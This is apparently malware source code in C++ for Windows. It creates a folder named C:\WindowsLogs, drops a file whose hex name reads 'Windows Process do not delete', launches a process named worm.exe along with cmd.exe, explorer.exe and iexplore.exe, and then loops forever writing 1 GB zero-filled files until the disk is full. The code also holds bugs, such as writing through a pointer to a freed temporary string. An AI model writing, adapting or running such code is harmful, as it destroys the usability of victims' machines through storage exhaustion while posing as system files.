#include <Windows.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <iomanip>
#include <cstdlib>
#include <ctime>
#include <random>
using namespace std;

#define PATH "C:\\WindowsLogs"

#define FILE "C:\\WindowsLogs\\57696e646f77732050726f6365737320646f206e6f742064656c657465.info"

string getRandomHexName(int length) {
    stringstream ss;
    random_device rd;
    for (int i = 0; i < length; ++i) {
    	mt19937 mt(rd()); // Mersenne Twister engine
    	uniform_int_distribution<int> dist(0, 15);
        int randomValue = dist(mt);
        ss << hex << randomValue;
    }

    return ss.str();
}


int main(){
	//ShellExecute(NULL,"open",PROCESSNAME,NULL,NULL, 1);
	srand(time(NULL));
    
    if (!CreateDirectory(PATH, NULL)) {
        std::cerr << "Error creating the folder." << std::endl;
    }
    
    
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));

        const char* processName = "worm.exe"; 
        const char* cmd = "cnd.exe";
        const char* explorer = "explorer.exe";
        const char* processNames[] = {"worm.exe", "cmd.exe", "explorer.exe","iexplore.exe"};

		for(int i = 0; i < 4; i++){
			if (!CreateProcess(
	            NULL,               // No module name (use command line)
	            (LPSTR)processNames[i], // Command line
	            NULL,               // Process handle not inheritable
	            NULL,               // Thread handle not inheritable
	            FALSE,              // Set handle inheritance to FALSE
	            0,                  // No creation flags
	            NULL,               // Use parent's environment block
	            NULL,               // Use parent's starting directory
	            &si,                // Pointer to STARTUPINFO structure
	            &pi                 // Pointer to PROCESS_INFORMATION structure
	        )) {
	            std::cerr << "Error creating process: " << GetLastError() << std::endl;
	            //return 1;
	        }
		}
        

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    
    
   while (true) {
        string randomHexName = getRandomHexName(rand() % 64 + 32);
        const char* filename = ("C:\\WindowsLogs\\"+randomHexName+".bin").c_str();
        const int fileSizeInBytes = 1024 * 1024 * 1024;

        ofstream file(filename, ios::binary);
        char zeroByte = 0;
        for (int i = 0; i < fileSizeInBytes; ++i) {
            file.write(&zeroByte, 1);
        }
    }
	
    return EXIT_SUCCESS;
}
